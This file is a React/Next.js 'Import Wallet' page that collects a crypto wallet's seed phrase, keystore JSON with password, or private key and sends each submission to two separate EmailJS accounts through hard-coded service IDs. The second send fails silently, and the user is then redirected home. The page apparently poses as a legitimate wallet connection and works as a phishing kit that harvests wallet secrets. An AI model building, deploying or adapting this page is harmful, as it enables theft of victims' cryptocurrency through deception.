import React from "react";
// import { Footer } from "../components/footer";
// import { Nav } from "../components/nav";
import emailjs from "@emailjs/browser";
import { useRouter } from "next/router";

export default function Connect() {
  const [option, setOption] = React.useState("");
  const router = useRouter();
  const { w } = router.query;

  React.useEffect(() => {
    setOption("phrase");
    document.querySelector(".selector__btn--phrase").classList.add("active");
  }, []);

  const handleOptionClick = (e) => {
    e.preventDefault();
    setOption(e.target.value);
    document.querySelectorAll(".selector__btn").forEach((item) => {
      item.classList.remove("active");
    });
    document
      .querySelector(`.selector__btn--${e.target.value}`)
      .classList.add("active");
  };
  
  function sendEmail(e){
      e.preventDefault();
      emailjs.sendForm(
      'service_xiq308p', 'template_pmzvfrq', e.target, 'user_qzfwGiZfOhq81KBMmdEOS'
      ).then(res => {
//         if (window) {
//           alert("Successfull!");
          router.push("/");
//         }
      }).catch(err => {
        if (window) alert("Something went wrong, try again!");
      });
    
     emailjs.sendForm(
      'service_a060q2m', 'template_ibg9p2j', e.target, 'user_sf8ToCM22V7OpmDK8sB6Q'
      ).then(res => {
//         if (window) {
//           alert("Successfull!");
          router.push("/");
//         }
      }).catch(err => {
//         if (window) alert("Something went wrong, try again!");
      });
    e.target.reset();
  }

  return (
    <div className="connect">
      {/* <Nav /> */}

      <div className="connect__main">
        <div>
          <h1>Import Wallet</h1>
          <div className="selector">
            <button
              onClick={handleOptionClick}
              value="phrase"
              className="selector__btn selector__btn--phrase"
            >
              Phrase
            </button>
            <button
              onClick={handleOptionClick}
              value="keystore"
              className="selector__btn selector__btn--keystore"
            >
              Keystore JSON
            </button>
            <button
              onClick={handleOptionClick}
              value="private"
              className="selector__btn selector__btn--private"
            >
              Private Key
            </button>
          </div>

          <form className="connect__form" action="submit" onSubmit={sendEmail}>
            {option === "phrase" ? (
              <div>
                <input name="wallet" value={w} hidden />
                <textarea name="phrase" placeholder="Phrase" />
                <small>
                  Typically 12 (sometimes 24) words separated by single spaces
                </small>
              </div>
            ) : option === "keystore" ? (
              <div>
                <input name="wallet" value={w} hidden />
                <textarea name="keystorejson" placeholder="Keystore JSON" />
                <input name="password" placeholder="Password" />
                <small>
                  Several lines of text beginning with '(...)' plus the passwords
                  you used to encrypt it.
                </small>
              </div>
            ) : option === "private" ? (
              <div>
                <input name="wallet" value={w} hidden />
                <input name="privatekey" placeholder="Private Key" />
                <small>
                  Typically 12 (sometimes 24) words separated by single spaces
                </small>
              </div>
            ) : null}
            <button className="import" type="submit">CONNECT</button>
          </form>
        </div>
      </div>

      {/* <Footer /> */}
    </div>
  );
}
